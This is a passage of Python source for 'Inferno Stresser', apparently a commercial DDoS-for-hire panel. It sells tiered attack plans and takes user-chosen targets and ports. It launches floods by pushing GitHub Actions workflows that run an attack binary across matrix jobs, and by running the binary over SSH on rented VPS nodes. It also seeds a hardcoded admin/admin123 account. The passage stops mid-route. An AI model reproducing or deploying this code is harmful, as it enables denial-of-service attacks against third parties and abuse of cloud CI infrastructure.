#!/usr/bin/env python3
"""
Inferno Stresser - Complete Web Panel
Features: User/Admin auth, Attack Hub, Plans, Key Redemption, Admin Dashboard,
Node Management (GitHub/VPS), Key Management, Settings, Test Attack Lab,
Manage Admins (granular permissions), API Key Management, API Attack Endpoint.
"""
import os
import socket
import random
import time
import threading
import secrets
import paramiko
import json
import io
import certifi
from datetime import datetime, timedelta
from functools import wraps
from flask import Flask, render_template_string, request, redirect, url_for, flash, session, jsonify
from pymongo import MongoClient
from bson.objectid import ObjectId
from werkzeug.security import generate_password_hash, check_password_hash
from flask_sqlalchemy import SQLAlchemy
from github import Github, GithubException

# ==================== FLASK APP INIT ====================
app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", secrets.token_urlsafe(32))
app.config['MAX_CONTENT_LENGTH'] = 100 * 1024 * 1024  # 100 MB

os.makedirs(os.path.join(app.root_path, 'keys'), exist_ok=True)
os.makedirs(os.path.join(app.root_path, 'backups'), exist_ok=True)

# ==================== GLOBAL CONFIG ====================
MAINTENANCE_MODE = False
GLOBAL_COOLDOWN = 30
MAX_ATTACK_DURATION = 300
DEFAULT_THREADS = 1500
MAX_THREADS_LIMIT = 10000

# ==================== PLAN DEFINITIONS ====================
PLANS = [
    {'name': 'Free Plan', 'price': 'Free', 'concurrent': 1, 'duration': 60, 'threads': 1500, 'key_prefix': 'FREE'},
    {'name': 'Pro Plan', 'price': '₹399/month', 'concurrent': 1, 'duration': 120, 'threads': 3000, 'key_prefix': 'PRO'},
    {'name': 'Enterprise Plan', 'price': '₹999/month', 'concurrent': 5, 'duration': 300, 'threads': 5000, 'key_prefix': 'ENT'},
    {'name': 'Ultimate Plan', 'price': '₹2499/month', 'concurrent': 10, 'duration': 600, 'threads': 10000, 'key_prefix': 'ULT'}
]

# ==================== ATTACK QUEUE ====================
attack_lock = threading.Lock()
attack_queue = []
is_attacking = False
current_attack = None

# ==================== DATABASE SETUP ====================
USE_MONGO = False
MONGO_URL = os.environ.get("MONGO_URL")
if MONGO_URL:
    try:
        mongo_client = MongoClient(
            MONGO_URL,
            serverSelectionTimeoutMS=10000,
            connectTimeoutMS=30000,
            socketTimeoutMS=30000,
            tls=True,
            tlsCAFile=certifi.where()
        )
        mongo_client.admin.command('ping')
        db = mongo_client['stresser_db']
        USE_MONGO = True
        print("✅ MongoDB connected")

        # Assign collections
        users_col = db['users']
        api_keys_col = db['api_keys']
        attack_logs_col = db['attack_logs']
        attack_nodes_col = db['attack_nodes']
        admin_users_col = db['admin_users']
        generated_keys_col = db['generated_keys']

        # Ensure collections exist
        for coll in ['users', 'api_keys', 'attack_logs', 'attack_nodes', 'admin_users', 'generated_keys']:
            if coll not in db.list_collection_names():
                db.create_collection(coll)

        # Upgrade existing admin docs
        admin_users_col.update_many(
            {"is_super": {"$exists": False}},
            {"$set": {"is_super": True, "permissions": []}}
        )

        # Create default super admin if none
        if admin_users_col.count_documents({}) == 0:
            admin_users_col.insert_one({
                "username": "admin",
                "password_hash": generate_password_hash("admin123"),
                "permissions": [],
                "is_super": True,
                "created_at": datetime.utcnow()
            })
            print("Default super admin created (admin / admin123)")

    except Exception as e:
        print(f"❌ MongoDB error: {e} – falling back to SQLite")
        USE_MONGO = False
else:
    print("⚠️ MONGO_URL not set – using SQLite")

if USE_MONGO:
    # Already assigned
    pass
else:
    app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///stresser.db'
    app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
    db_sql = SQLAlchemy(app)

    class User(db_sql.Model):
        id = db_sql.Column(db_sql.Integer, primary_key=True)
        token = db_sql.Column(db_sql.String(128), unique=True, nullable=False)
        plan = db_sql.Column(db_sql.String(50), default="Free Plan")
        max_concurrent = db_sql.Column(db_sql.Integer, default=1)
        max_duration = db_sql.Column(db_sql.Integer, default=60)
        max_threads = db_sql.Column(db_sql.Integer, default=1500)
        slots_used = db_sql.Column(db_sql.Integer, default=0)
        total_attacks = db_sql.Column(db_sql.Integer, default=0)
        role = db_sql.Column(db_sql.String(20), default="user")
        expiry = db_sql.Column(db_sql.DateTime, nullable=True)
        added_by = db_sql.Column(db_sql.Integer, nullable=True)
        last_attack = db_sql.Column(db_sql.DateTime, nullable=True)
        created_at = db_sql.Column(db_sql.DateTime, default=datetime.utcnow)

    class ApiKey(db_sql.Model):
        id = db_sql.Column(db_sql.Integer, primary_key=True)
        user_id = db_sql.Column(db_sql.Integer, db_sql.ForeignKey('user.id'))
        key = db_sql.Column(db_sql.String(64), unique=True, nullable=False)
        name = db_sql.Column(db_sql.String(100), default="Default")
        plan_name = db_sql.Column(db_sql.String(50), nullable=True)
        max_concurrent = db_sql.Column(db_sql.Integer, nullable=True)
        max_duration = db_sql.Column(db_sql.Integer, nullable=True)
        max_threads = db_sql.Column(db_sql.Integer, nullable=True)
        expires_at = db_sql.Column(db_sql.DateTime, nullable=True)
        active = db_sql.Column(db_sql.Boolean, default=True)
        last_used = db_sql.Column(db_sql.DateTime, nullable=True)
        total_attacks = db_sql.Column(db_sql.Integer, default=0)
        created_at = db_sql.Column(db_sql.DateTime, default=datetime.utcnow)

    class AttackLog(db_sql.Model):
        id = db_sql.Column(db_sql.Integer, primary_key=True)
        user_id = db_sql.Column(db_sql.Integer, db_sql.ForeignKey('user.id'))
        target = db_sql.Column(db_sql.String(100))
        port = db_sql.Column(db_sql.Integer)
        duration = db_sql.Column(db_sql.Integer)
        method = db_sql.Column(db_sql.String(20), default="udp")
        threads = db_sql.Column(db_sql.Integer, default=1500)
        concurrent = db_sql.Column(db_sql.Integer, default=1)
        github_nodes_used = db_sql.Column(db_sql.Integer, default=0)
        vps_nodes_used = db_sql.Column(db_sql.Integer, default=0)
        status = db_sql.Column(db_sql.String(20), default='completed')
        timestamp = db_sql.Column(db_sql.DateTime, default=datetime.utcnow)

    class AttackNode(db_sql.Model):
        id = db_sql.Column(db_sql.Integer, primary_key=True)
        name = db_sql.Column(db_sql.String(100), nullable=False)
        node_type = db_sql.Column(db_sql.String(20), nullable=False)
        enabled = db_sql.Column(db_sql.Boolean, default=True)
        github_token = db_sql.Column(db_sql.String(200), nullable=True)
        github_repo = db_sql.Column(db_sql.String(200), nullable=True)
        github_username = db_sql.Column(db_sql.String(100), nullable=True)
        github_status = db_sql.Column(db_sql.String(50), default="unknown")
        vps_host = db_sql.Column(db_sql.String(100), nullable=True)
        vps_port = db_sql.Column(db_sql.Integer, default=22)
        vps_username = db_sql.Column(db_sql.String(100), nullable=True)
        vps_password = db_sql.Column(db_sql.String(200), nullable=True)
        vps_key_path = db_sql.Column(db_sql.String(200), nullable=True)
        last_status = db_sql.Column(db_sql.String(50), default="unknown")
        status_detail = db_sql.Column(db_sql.String(50), default="unknown")
        binary_present = db_sql.Column(db_sql.Boolean, default=False)
        workflow_tested = db_sql.Column(db_sql.Boolean, default=False)
        attack_count = db_sql.Column(db_sql.Integer, default=0)
        last_used = db_sql.Column(db_sql.DateTime, nullable=True)
        created_at = db_sql.Column(db_sql.DateTime, default=datetime.utcnow)

    class AdminUser(db_sql.Model):
        id = db_sql.Column(db_sql.Integer, primary_key=True)
        username = db_sql.Column(db_sql.String(80), unique=True, nullable=False)
        password_hash = db_sql.Column(db_sql.String(200), nullable=False)
        created_at = db_sql.Column(db_sql.DateTime, default=datetime.utcnow)
        permissions = db_sql.Column(db_sql.Text, default="[]")
        is_super = db_sql.Column(db_sql.Boolean, default=False)

    class GeneratedKey(db_sql.Model):
        id = db_sql.Column(db_sql.Integer, primary_key=True)
        key = db_sql.Column(db_sql.String(64), unique=True, nullable=False)
        plan = db_sql.Column(db_sql.String(50), default="Pro Plan")
        duration_days = db_sql.Column(db_sql.Integer, default=30)
        created_by = db_sql.Column(db_sql.Integer, db_sql.ForeignKey('user.id'))
        created_at = db_sql.Column(db_sql.DateTime, default=datetime.utcnow)
        used_by = db_sql.Column(db_sql.Integer, db_sql.ForeignKey('user.id'), nullable=True)
        used_at = db_sql.Column(db_sql.DateTime, nullable=True)
        active = db_sql.Column(db_sql.Boolean, default=True)

    with app.app_context():
        db_sql.create_all()
        if not User.query.first():
            default_token = secrets.token_urlsafe(32)
            user = User(token=default_token, plan="Free Plan", max_concurrent=1, max_duration=60, max_threads=1500, role="user")
            db_sql.session.add(user)
            db_sql.session.commit()
            print(f"SQLite: default user token: {default_token}")

# ==================== HELPER FUNCTIONS ====================
def generate_captcha():
    a = random.randint(1, 10)
    b = random.randint(1, 10)
    op = random.choice(['+', '-'])
    if op == '+':
        return f"{a} + {b} = ?", a + b
    else:
        if a < b:
            a, b = b, a
        return f"{a} - {b} = ?", a - b

def generate_token():
    return secrets.token_urlsafe(32)

def get_user_by_token(token):
    if USE_MONGO:
        return users_col.find_one({"token": token})
    else:
        return User.query.filter_by(token=token).first()

def admin_required(permission=None):
    def decorator(f):
        @wraps(f)
        def decorated_function(*args, **kwargs):
            if not session.get('admin_logged_in'):
                flash('Please login as admin first', 'danger')
                return redirect(url_for('admin_login'))
            if permission:
                admin_perms = session.get('admin_permissions', [])
                is_super = session.get('admin_is_super', False)
                if not is_super and permission not in admin_perms:
                    flash('You do not have permission to access this page.', 'danger')
                    return redirect(url_for('admin_dashboard'))
            return f(*args, **kwargs)
        return decorated_function
    return decorator

def can_user_attack(user):
    role = user.get('role') if USE_MONGO else user.role
    if role == 'admin':
        return True, 0
    last = user.get('last_attack') if USE_MONGO else user.last_attack
    if last:
        elapsed = (datetime.utcnow() - last).total_seconds()
        if elapsed < GLOBAL_COOLDOWN:
            return False, GLOBAL_COOLDOWN - elapsed
    return True, 0

def process_attack_queue():
    global is_attacking, current_attack
    while True:
        with attack_lock:
            if not attack_queue:
                is_attacking = False
                current_attack = None
                break
            params = attack_queue.pop(0)
            current_attack = params
        try:
            run_attack(params)
        except Exception as e:
            print(f"Attack error: {e}")
        time.sleep(1)

def run_attack(params):
    user_id = params['user_id']
    target = params['target']
    port = params['port']
    duration = params['duration']
    method = params.get('method', 'udp')
    threads = params.get('threads', DEFAULT_THREADS)
    concurrent = params.get('concurrent', 1)

    if USE_MONGO:
        github_nodes = list(attack_nodes_col.find({"enabled": True, "node_type": "github"}))
        vps_nodes = list(attack_nodes_col.find({"enabled": True, "node_type": "vps"}))
    else:
        github_nodes = AttackNode.query.filter_by(enabled=True, node_type='github').all()
        vps_nodes = AttackNode.query.filter_by(enabled=True, node_type='vps').all()

    github_success = 0
    vps_success = 0

    for node in github_nodes:
        if trigger_github_attack(node, target, port, duration, method, threads):
            github_success += 1

    for node in vps_nodes:
        if trigger_vps_attack(node, target, port, duration, method, threads):
            vps_success += 1

    if USE_MONGO:
        attack_logs_col.insert_one({
            "user_id": user_id, "target": target, "port": port, "duration": duration,
            "method": method, "threads": threads, "concurrent": concurrent,
            "github_nodes_used": github_success, "vps_nodes_used": vps_success,
            "status": "completed", "timestamp": datetime.utcnow()
        })
        users_col.update_one({"_id": user_id}, {"$inc": {"total_attacks": 1, "slots_used": -concurrent}})
    else:
        log = AttackLog(user_id=user_id, target=target, port=port, duration=duration, method=method,
                        threads=threads, concurrent=concurrent, github_nodes_used=github_success,
                        vps_nodes_used=vps_success, status='completed')
        db_sql.session.add(log)
        user = User.query.get(user_id)
        if user:
            user.total_attacks += 1
            user.slots_used = max(0, user.slots_used - concurrent)
        db_sql.session.commit()

def trigger_github_attack(node, target, port, duration, method='udp', threads=1500):
    token = node['github_token'] if USE_MONGO else node.github_token
    repo_name = node['github_repo'] if USE_MONGO else node.github_repo
    matrix_size = 10
    matrix_list = ','.join(str(i) for i in range(1, matrix_size + 1))
    yml_content = f"""name: Inferno Attack
on: [push]

jobs:
  stage-0-init:
    runs-on: ubuntu-22.04
    strategy:
      matrix:
        n: [{matrix_list}]
    steps:
      - uses: actions/checkout@v3
      - run: chmod +x primex
      - run: ./primex {method} {target} {port} 10 {threads}

  stage-1-main:
    needs: stage-0-init
    runs-on: ubuntu-22.04
    strategy:
      matrix:
        n: [{matrix_list}]
    steps:
      - uses: actions/checkout@v3
      - run: chmod +x primex
      - run: ./primex {method} {target} {port} {duration} {threads}

  stage-2-calc:
    runs-on: ubuntu-latest
    outputs:
      matrix_list: ${{{{ steps.calc.outputs.matrix_list }}}}
    steps:
      - id: calc
        run: |
          NUM_JOBS=$(({duration} / 10))
          if [ $NUM_JOBS -lt 1 ]; then NUM_JOBS=1; fi
          ARRAY=$(seq 1 $NUM_JOBS | jq -R . | jq -s -c .)
          echo "matrix_list=$ARRAY" >> $GITHUB_OUTPUT

  stage-2-sequential:
    needs: [stage-0-init, stage-2-calc]
    runs-on: ubuntu-22.04
    strategy:
      max-parallel: 1
      matrix:
        iteration: ${{{{ fromJson(needs.stage-2-calc.outputs.matrix_list) }}}}
    steps:
      - uses: actions/checkout@v3
      - run: chmod +x primex
      - run: ./primex {method} {target} {port} 10 {threads}

  stage-3-cleanup:
    needs: [stage-1-main, stage-2-sequential]
    runs-on: ubuntu-22.04
    if: always()
    steps:
      - run: echo "Attack completed on $(date)"
"""
    try:
        g = Github(token)
        repo = g.get_repo(repo_name)
        try:
            contents = repo.get_contents(".github/workflows/main.yml")
            repo.update_file(".github/workflows/main.yml", f"Attack {target}:{port}", yml_content, contents.sha)
        except:
            repo.create_file(".github/workflows/main.yml", f"Attack {target}:{port}", yml_content)
        if USE_MONGO:
            attack_nodes_col.update_one({"_id": node['_id']}, {"$inc": {"attack_count": 1}, "$set": {"last_used": datetime.utcnow(), "workflow_tested": True}})
        else:
            node.attack_count += 1
            node.last_used = datetime.utcnow()
            node.workflow_tested = True
            db_sql.session.commit()
        return True
    except Exception as e:
        print(f"GitHub error: {e}")
        return False

def trigger_vps_attack(node, target, port, duration, method, threads):
    host = node['vps_host'] if USE_MONGO else node.vps_host
    ssh_port = node['vps_port'] if USE_MONGO else node.vps_port
    username = node['vps_username'] if USE_MONGO else node.vps_username
    password = node.get('vps_password') if USE_MONGO else node.vps_password
    key_path = node.get('vps_key_path') if USE_MONGO else node.vps_key_path

    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        if key_path and os.path.exists(key_path):
            ssh.connect(host, port=ssh_port, username=username, key_filename=key_path, timeout=10)
        elif password:
            ssh.connect(host, port=ssh_port, username=username, password=password, timeout=10)
        else:
            return False

        stdin, stdout, stderr = ssh.exec_command("whoami")
        user = stdout.read().decode().strip()
        if user == "root":
            binary_path = "/root/primex"
            work_dir = "/root"
        else:
            binary_path = f"/home/{user}/primex"
            work_dir = f"/home/{user}"

        ssh.exec_command("pkill -f primex; sleep 1")
        cmd = f"cd {work_dir} && nohup {binary_path} {method} {target} {port} {duration} {threads} > /dev/null 2>&1 &"
        ssh.exec_command(cmd)
        ssh.close()

        if USE_MONGO:
            attack_nodes_col.update_one({"_id": node['_id']}, {"$inc": {"attack_count": 1}, "$set": {"last_used": datetime.utcnow()}})
        else:
            node.attack_count += 1
            node.last_used = datetime.utcnow()
            db_sql.session.commit()
        return True
    except Exception as e:
        print(f"VPS error: {e}")
        return False

# ==================== NODE TESTING FUNCTIONS ====================
def test_github_node_detailed(node):
    token = node['github_token'] if USE_MONGO else node.github_token
    repo_name = node['github_repo'] if USE_MONGO else node.github_repo
    result = {'status': 'unknown', 'message': '', 'binary_present': False, 'workflow_ok': False}
    try:
        g = Github(token)
        repo = g.get_repo(repo_name)
        try:
            repo.get_contents("primex")
            result['binary_present'] = True
        except:
            pass
        try:
            repo.get_contents(".github/workflows/main.yml")
            result['workflow_ok'] = True
        except:
            pass
        result['status'] = 'active'
        result['message'] = f"OK (Binary: {'✓' if result['binary_present'] else '✗'}, WF: {'✓' if result['workflow_ok'] else '✗'})"
        if USE_MONGO:
            attack_nodes_col.update_one({"_id": node['_id']}, {"$set": {
                "last_status": "online", "status_detail": "active",
                "binary_present": result['binary_present'], "workflow_tested": result['workflow_ok'],
                "github_status": "active"}})
        else:
            node.last_status = "online"
            node.status_detail = "active"
            node.binary_present = result['binary_present']
            node.workflow_tested = result['workflow_ok']
            node.github_status = "active"
            db_sql.session.commit()
    except Exception as e:
        result['status'] = 'dead'
        result['message'] = str(e)
    return result

def test_vps_node_detailed(node):
    host = node['vps_host'] if USE_MONGO else node.vps_host
    port = node['vps_port'] if USE_MONGO else node.vps_port
    username = node['vps_username'] if USE_MONGO else node.vps_username
    password = node.get('vps_password') if USE_MONGO else node.vps_password
    key_path = node.get('vps_key_path') if USE_MONGO else node.vps_key_path
    result = {'status': 'unknown', 'message': '', 'binary_present': False}
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        if key_path and os.path.exists(key_path):
            ssh.connect(host, port=port, username=username, key_filename=key_path, timeout=5)
        elif password:
            ssh.connect(host, port=port, username=username, password=password, timeout=5)
        else:
            result['status'] = 'dead'
            result['message'] = 'No auth method'
            return result
        stdin, stdout, stderr = ssh.exec_command("whoami")
        user = stdout.read().decode().strip()
        if user == "root":
            check_cmd = "test -f /root/primex && echo 'exists'"
        else:
            check_cmd = f"test -f /home/{user}/primex && echo 'exists'"
        stdin, stdout, stderr = ssh.exec_command(check_cmd)
        output = stdout.read().decode().strip()
        ssh.close()
        result['binary_present'] = (output == 'exists')
        result['status'] = 'active' if result['binary_present'] else 'no_binary'
        result['message'] = 'OK (Binary found)' if result['binary_present'] else 'Connected but no binary'
        if USE_MONGO:
            attack_nodes_col.update_one({"_id": node['_id']}, {"$set": {
                "last_status": "online", "status_detail": result['status'],
                "binary_present": result['binary_present']}})
        else:
            node.last_status = "online"
            node.status_detail = result['status']
            node.binary_present = result['binary_present']
            db_sql.session.commit()
    except Exception as e:
        result['status'] = 'dead'
        result['message'] = str(e)
    return result

# ==================== USER ROUTES ====================
@app.route('/')
def index():
    return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        token = request.form.get('token')
        captcha_answer = request.form.get('captcha')
        if not captcha_answer or str(captcha_answer) != str(session.get('captcha_answer')):
            flash('Invalid captcha', 'danger')
        else:
            user = get_user_by_token(token)
            if user:
                session['user_token'] = token
                session['user_id'] = str(user['_id']) if USE_MONGO else user.id
                session['user_role'] = user.get('role', 'user') if USE_MONGO else user.role
                flash('Logged in', 'success')
                return redirect(url_for('dashboard'))
            flash('Invalid token', 'danger')
    q, a = generate_captcha()
    session['captcha_question'] = q
    session['captcha_answer'] = a
    return render_template_string(LOGIN_HTML, captcha_question=q)

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        captcha_answer = request.form.get('captcha')
        if not captcha_answer or str(captcha_answer) != str(session.get('captcha_answer')):
            flash('Invalid captcha', 'danger')
        else:
            token = generate_token()
            if USE_MONGO:
                users_col.insert_one({
                    "token": token, "plan": "Free Plan", "max_concurrent": 1, "max_duration": 60,
                    "max_threads": 1500, "slots_used": 0, "total_attacks": 0, "role": "user",
                    "created_at": datetime.utcnow()
                })
            else:
                user = User(token=token, plan="Free Plan", max_concurrent=1, max_duration=60, max_threads=1500, role="user")
                db_sql.session.add(user)
                db_sql.session.commit()
            flash(f'Your access token: {token}', 'success')
            return redirect(url_for('login'))
    q, a = generate_captcha()
    session['captcha_question'] = q
    session['captcha_answer'] = a
    return render_template_string(REGISTER_HTML, captcha_question=q)

@app.route('/dashboard')
def dashboard():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    if USE_MONGO:
        user = users_col.find_one({"_id": ObjectId(session['user_id'])})
        attacks = list(attack_logs_col.find({"user_id": session['user_id']}).sort("timestamp", -1).limit(10))
        slots_used = user.get('slots_used', 0)
        max_slots = user.get('max_concurrent', 1)
    else:
        user = User.query.get(session['user_id'])
        attacks = AttackLog.query.filter_by(user_id=user.id).order_by(AttackLog.timestamp.desc()).limit(10).all()
        slots_used = user.slots_used
        max_slots = user.max_concurrent
    return render_template_string(DASHBOARD_HTML, user=user, attacks=attacks, slots_used=slots_used, max_slots=max_slots)

@app.route('/attack', methods=['GET', 'POST'])
def attack_page():
    global is_attacking
    if 'user_id' not in session:
        return redirect(url_for('login'))
    if MAINTENANCE_MODE and session.get('user_role') != 'admin':
        flash('Maintenance mode - attacks disabled', 'warning')
        return redirect(url_for('dashboard'))

    if USE_MONGO:
        user = users_col.find_one({"_id": ObjectId(session['user_id'])})
    else:
        user = User.query.get(session['user_id'])

    if request.method == 'POST':
        target = request.form.get('target')
        port = int(request.form.get('port'))
        duration = int(request.form.get('duration'))
        method = request.form.get('method', 'udp')
        threads = int(request.form.get('threads', DEFAULT_THREADS))
        concurrent = int(request.form.get('concurrent', 1))

        max_dur = user.get('max_duration', 60) if USE_MONGO else user.max_duration
        max_threads = user.get('max_threads', 1500) if USE_MONGO else user.max_threads
        max_conc = user.get('max_concurrent', 1) if USE_MONGO else user.max_concurrent

        if session.get('user_role') == 'admin':
            max_dur = 999999
            max_threads = MAX_THREADS_LIMIT
            max_conc = 999999

        if duration > max_dur:
            flash(f'Max duration {max_dur}s', 'danger')
            return redirect(url_for('attack_page'))
        if threads > max_threads:
            flash(f'Max threads {max_threads}', 'danger')
            return redirect(url_for('attack_page'))
        if concurrent > max_conc:
            flash(f'Max concurrent {max_conc}', 'danger')
            return redirect(url_for('attack_page'))

        slots_used = user.get('slots_used', 0) if USE_MONGO else user.slots_used
        if slots_used + concurrent > max_conc:
            flash('No free slots', 'danger')
            return redirect(url_for('attack_page'))

        can, remaining = can_user_attack(user)
        if not can:
            flash(f'Cooldown: {remaining:.0f}s', 'danger')
            return redirect(url_for('attack_page'))

        with attack_lock:
            attack_queue.append({
                'user_id': ObjectId(session['user_id']) if USE_MONGO else session['user_id'],
                'target': target, 'port': port, 'duration': duration,
                'method': method, 'threads': threads, 'concurrent': concurrent
            })
            if not is_attacking:
                is_attacking = True
                threading.Thread(target=process_attack_queue).start()

        if USE_MONGO:
            users_col.update_one(
                {"_id": ObjectId(session['user_id'])},
                {"$set": {"last_attack": datetime.utcnow()}, "$inc": {"slots_used": concurrent}}
            )
        else:
            user.last_attack = datetime.utcnow()
            user.slots_used += concurrent
            db_sql.session.commit()

        flash('Attack queued', 'success')
        return redirect(url_for('attack_page'))

    return render_template_string(ATTACK_HTML, user=user)

@app.route('/products')
def products_page():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    if USE_MONGO:
        user = users_col.find_one({"_id": ObjectId(session['user_id'])})
    else:
        user = User.query.get(session['user_id'])
    return render_template_string(PRODUCTS_HTML, user=user, plans=PLANS)

@app.route('/redeem', methods=['GET', 'POST'])
def redeem_key():
    if request.method == 'POST':
        key_str = request.form.get('key', '').strip().upper()
        if USE_MONGO:
            key = generated_keys_col.find_one({"key": key_str, "active": True, "used_by": None})
        else:
            key = GeneratedKey.query.filter_by(key=key_str, active=True, used_by=None).first()
        if not key:
            flash('Invalid or already used key', 'danger')
            return redirect(url_for('dashboard'))

        days = key['duration_days'] if USE_MONGO else key.duration_days
        plan_name = key.get('plan', 'Pro Plan') if USE_MONGO else key.plan
        plan = next((p for p in PLANS if p['name'] == plan_name), PLANS[1])

        if 'user_id' in session:
            if USE_MONGO:
                users_col.update_one(
                    {"_id": ObjectId(session['user_id'])},
                    {"$set": {
                        "plan": plan_name,
                        "max_concurrent": plan['concurrent'],
                        "max_duration": plan['duration'],
                        "max_threads": plan['threads'],
                        "expiry": datetime.utcnow() + timedelta(days=days),
                        "role": "user"
                    }}
                )
            else:
                user = User.query.get(session['user_id'])
                user.plan = plan_name
                user.max_concurrent = plan['concurrent']
                user.max_duration = plan['duration']
                user.max_threads = plan['threads']
                user.expiry = datetime.utcnow() + timedelta(days=days)
                user.role = 'user'
                db_sql.session.commit()
        else:
            token = generate_token()
            expiry = datetime.utcnow() + timedelta(days=days)
            if USE_MONGO:
                user_id = users_col.insert_one({
                    "token": token,
                    "plan": plan_name,
                    "max_concurrent": plan['concurrent'],
                    "max_duration": plan['duration'],
                    "max_threads": plan['threads'],
                    "role": "user",
                    "expiry": expiry,
                    "created_at": datetime.utcnow()
                }).inserted_id
            else:
                user = User(
                    token=token,
                    plan=plan_name,
                    max_concurrent=plan['concurrent'],
                    max_duration=plan['duration'],
                    max_threads=plan['threads'],
                    role="user",
                    expiry=expiry
                )
                db_sql.session.add(user)
                db_sql.session.commit()
                user_id = user.id
            session['user_token'] = token
            session['user_id'] = str(user_id) if USE_MONGO else user_id
            session['user_role'] = 'user'

        if USE_MONGO:
            generated_keys_col.update_one({"_id": key['_id']}, {"$set": {"used_by": session['user_id'], "used_at": datetime.utcnow(), "active": False}})
        else:
            key.used_by = session['user_id']
            key.used_at = datetime.utcnow()
            key.active = False
            db_sql.session.commit()

        flash(f'Key redeemed! Your plan is now {plan_name}.', 'success')
        return redirect(url_for('dashboard'))

    return render_template_string(REDEEM_HTML)

@app.route('/logout')
def logout():
    session.clear()
    flash('Logged out', 'success')
    return redirect(url_for('login'))

# ==================== ADMIN ROUTES ====================
@app.route('/admin/login', methods=['GET', 'POST'])
def admin_login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        if USE_MONGO:
            admin = admin_users_col.find_one({"username": username})
            if admin and check_password_hash(admin['password_hash'], password):
                session['admin_logged_in'] = True
                session['admin_username'] = username
                session['admin_id'] = str(admin['_id'])
                session['admin_permissions'] = admin.get('permissions', [])
                session['admin_is_super'] = admin.get('is_super', False)
                flash('Welcome!', 'success')
                return redirect(url_for('admin_dashboard'))
        else:
            admin = AdminUser.query.filter_by(username=username).first()
            if admin and check_password_hash(admin.password_hash, password):
                session['admin_logged_in'] = True
                session['admin_username'] = username
                session['admin_id'] = admin.id
                session['admin_permissions'] = json.loads(admin.permissions) if admin.permissions else []
                session['admin_is_super'] = admin.is_super
                flash('Welcome!', 'success')
                return redirect(url_for('admin_dashboard'))
        flash('Invalid credentials', 'danger')
    return render_template_string(ADMIN_LOGIN_HTML)

@app.route('/admin/logout')
def admin_logout():
    session.pop('admin_logged_in', None)
    return redirect(url_for('admin_login'))

@app.route('/admin/dashboard')
@admin_required('dashboard')
def admin_dashboard():
    if USE_MONGO:
        total_users = users_col.count_documents({})
        total_attacks = attack_logs_col.count_documents({})
        total_nodes = attack_nodes_col.count_documents({})
        active_nodes = attack_nodes_col.count_documents({"enabled": True, "status_detail": "active"})
        total_keys = generated_keys_col.count_documents({})
    else:
        total_users = User.query.count()
        total_attacks = AttackLog.query.count()
        total_nodes = AttackNode.query.count()
        active_nodes = AttackNode.query.filter_by(enabled=True, status_detail='active').count()
        total_keys = GeneratedKey.query.count()
    can_manage = session.get('admin_is_super', False) or 'manage_admins' in session.get('admin_permissions', [])
    return render_template_string(ADMIN_DASHBOARD_ENHANCED_HTML,
                                  total_users=total_users, total_attacks=total_attacks,
                                  total_nodes=total_nodes, active_nodes=active_nodes,
                                  total_keys=total_keys, can_manage_admins=can_manage)

@app.route('/admin/nodes')
@admin_required('nodes')
def admin_nodes():
    if USE_MONGO:
        nodes = list(attack_nodes_col.find())
    else:
        nodes = AttackNode.query.all()
    return render_template_string(ADMIN_NODES_HTML, nodes=nodes)

@app.route('/admin/nodes/add_github', methods=['POST'])
@admin_required('nodes')
def admin_add_github_node():
    name = request.form.get('name')
    token = request.form.get('github_token')
    repo_name = request.form.get('github_repo', 'InfernoCore')
    enabled = request.form.get('enabled') == 'on'
    if not name or not token:
        flash('Name and token required', 'danger')
        return redirect(url_for('admin_nodes'))
    try:
        g = Github(token)
        user = g.get_user()
        try:
            repo = g.get_repo(f"{user.login}/{repo_name}")
            created = False
        except GithubException:
            repo = user.create_repo(repo_name, private=False, auto_init=False)
            created = True
        if USE_MONGO:
            attack_nodes_col.insert_one({
                "name": name, "node_type": "github", "enabled": enabled,
                "github_token": token, "github_repo": f"{user.login}/{repo_name}",
                "github_username": user.login, "github_status": "active",
                "status_detail": "unknown", "binary_present": False,
                "attack_count": 0, "created_at": datetime.utcnow()
            })
        else:
            node = AttackNode(
                name=name, node_type='github', enabled=enabled,
                github_token=token, github_repo=f"{user.login}/{repo_name}",
                github_username=user.login, github_status='active'
            )
            db_sql.session.add(node)
            db_sql.session.commit()
        flash(f"GitHub node added! Repo {'created' if created else 'exists'}", 'success')
    except Exception as e:
        flash(f'Error: {str(e)}', 'danger')
    return redirect(url_for('admin_nodes'))

@app.route('/admin/nodes/add_vps', methods=['POST'])
@admin_required('nodes')
def admin_add_vps_node():
    name = request.form.get('name')
    host = request.form.get('vps_host')
    port = int(request.form.get('vps_port', 22))
    username = request.form.get('vps_username')
    password = request.form.get('vps_password')
    enabled = request.form.get('enabled') == 'on'
    if not name or not host or not username:
        flash('Name, host and username required', 'danger')
        return redirect(url_for('admin_nodes'))
    key_path = None
    if 'vps_key_file' in request.files:
        file = request.files['vps_key_file']
        if file and file.filename:
            key_dir = os.path.join(app.root_path, 'keys')
            safe_name = f"vps_{int(time.time())}_{random.randint(1000,9999)}.pem"
            key_path = os.path.join(key_dir, safe_name)
            file.save(key_path)
            os.chmod(key_path, 0o600)
    if USE_MONGO:
        attack_nodes_col.insert_one({
            "name": name, "node_type": "vps", "enabled": enabled,
            "vps_host": host, "vps_port": port, "vps_username": username,
            "vps_password": password, "vps_key_path": key_path,
            "status_detail": "unknown", "binary_present": False,
            "attack_count": 0, "created_at": datetime.utcnow()
        })
    else:
        node = AttackNode(name=name, node_type='vps', enabled=enabled,
                          vps_host=host, vps_port=port, vps_username=username,
                          vps_password=password, vps_key_path=key_path)
        db_sql.session.add(node)
        db_sql.session.commit()
    flash('VPS node added', 'success')
    return redirect(url_for('admin_nodes'))

@app.route('/admin/nodes/<node_id>/check', methods=['POST'])
@admin_required('nodes')
def admin_check_node(node_id):
    if USE_MONGO:
        node = attack_nodes_col.find_one({"_id": ObjectId(node_id)})
    else:
        node = AttackNode.query.get(node_id)
    if node:
